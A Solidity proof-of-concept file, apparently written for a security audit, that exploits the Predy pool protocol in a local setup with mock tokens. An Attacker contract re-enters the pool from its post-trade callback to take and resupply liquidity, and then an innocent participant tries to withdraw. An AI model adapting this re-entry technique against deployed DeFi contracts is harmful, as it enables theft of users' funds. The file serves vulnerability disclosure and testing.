// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UniswapV3Factory} from "@uniswap/v3-core/contracts/UniswapV3Factory.sol";
import {WETH9} from "canonical-weth/contracts/WETH9.sol";
import {UniswapV3Factory} from "@uniswap/v3-core/contracts/UniswapV3Factory.sol";
import {NonfungibleTokenPositionDescriptor} from "@uniswap/v3-periphery/contracts/NonfungibleTokenPositionDescriptor.sol";
import {INonfungibleTokenPositionDescriptor} from "@uniswap/v3-periphery/contracts/interfaces/INonfungibleTokenPositionDescriptor.sol";

import {NonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/NonfungiblePositionManager.sol";
import {INonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import {IHooks} from "src/interfaces/IHooks.sol";
import {IPredyPool} from "src/interfaces/IPredyPool.sol";

import {__Yult__Toolbox} from "Yult.sol";
import {AERC20} from "AERC20.sol";
import {PredyParticipant} from "PredyParticipant.sol";

// To check the supply balance in PredyPool.
import {ISupplyToken} from "src/interfaces/ISupplyToken.sol";



contract TokenA is AERC20 {
  constructor() AERC20("TokenA", "TKA") {
    _mint(msg.sender, 1000 * (10 ** decimals()));
  }
}
contract TokenB is AERC20 {
  constructor() AERC20("TokenB", "TKB") {
    _mint(msg.sender, 1000 * (10 ** decimals()));
  }
}

// Attacker is deployed before the attack so its code exists when the
// callback arrives (unlike the Deployer, which is still mid-constructor).
contract Attacker {
  PredyParticipant participant;

  AERC20 tokenA;
  AERC20 tokenB;

  constructor(AERC20 _tokenA, AERC20 _tokenB, uint24 fee, __Yult__Toolbox toolbox) {
    tokenA = _tokenA;
    tokenB = _tokenB;
    participant = new PredyParticipant(tokenA, tokenB, fee, toolbox);
  }

  function attack() external {
    uint bal = tokenA.balanceOf(address(this));
    tokenA.transfer(address(participant), bal);
    tokenB.transfer(address(participant), bal);
    participant.createPredyPool();
    participant.trade();
    participant.withdrawLiquidity(true);
    participant.withdrawLiquidity(false);
  }

  function predySettlementCallback(
    address /*quoteToken*/,
    address /*baseToken*/,
    bytes memory /*settlementData*/,
    int256 /*baseAmountDelta*/
  ) external {
  }

  function predyTradeAfterCallback(
    IPredyPool.TradeParams memory /*tradeParams*/,
    IPredyPool.TradeResult memory /*tradeResult*/
  ) external {
    participant.take(true);
    participant.take(false);
    participant.supplyLiquidity(true);
    participant.supplyLiquidity(false);
  }
}

contract Deployer {
  constructor() payable {

      WETH9 weth     = new WETH9();
      AERC20 tokenA = AERC20(new TokenA());
      AERC20 tokenB   = AERC20(new TokenB());
      __Yult__Toolbox toolbox = new __Yult__Toolbox(weth, tokenA, tokenB);

      uint moveAmount = 10;
      uint24 fee1 = 3000;
      uint24 fee2 = 10000;

      // Create Participant Contracts
      PredyParticipant participant1 = new PredyParticipant(tokenA, tokenB, fee1, toolbox);
      Attacker attacker = new Attacker(tokenA, tokenB, fee2, toolbox);

      // Give tokens to participants
      uint participantFunds = 1 + moveAmount * (10 ** tokenA.decimals());
      tokenA.transfer(address(participant1), participantFunds);
      tokenB.transfer(address(participant1), participantFunds);
      tokenA.transfer(address(attacker), participantFunds);
      tokenB.transfer(address(attacker), participantFunds);

      participant1.createPredyPool();
      participant1.supplyLiquidity(true);
      participant1.supplyLiquidity(false);

      // Attacker's hack (funds participant2, creates pool, trades, withdraws)
      attacker.attack();

      // Innocent tries legitimate withdrawal.
      participant1.withdrawLiquidity(true);
      participant1.withdrawLiquidity(false);

    }
}

